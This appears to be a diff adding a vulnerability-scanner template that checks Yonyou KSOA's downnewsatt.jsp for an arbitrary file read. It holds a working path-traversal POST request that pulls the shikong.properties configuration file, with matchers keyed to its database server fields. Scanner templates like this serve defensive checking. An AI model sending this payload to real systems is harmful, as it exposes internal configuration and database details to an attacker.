@@ -1,0 +1,33 @@
+id: yonyou-ksoa-downnewsatt-fileread
+info:
+  name: 用友时空KSOA downnewsatt.jsp 存在任意文件读取漏洞
+  author: leadlife
+  severity: high
+  description: 用友时空KSOA downnewsatt.jsp 存在任意文件读取漏洞，攻击者可获取系统内部配置文件敏感信息
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/hy2cazv3m4ganw5n
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: yonyou,ksoa,fileread
+
+http:
+  - raw:
+      - |
+        POST /newspublish/downnewsatt.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        exclusivenm=../../WEB-INF/classes/shikong.properties
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'server.dbserver','server.skmaster')
+        condition: and
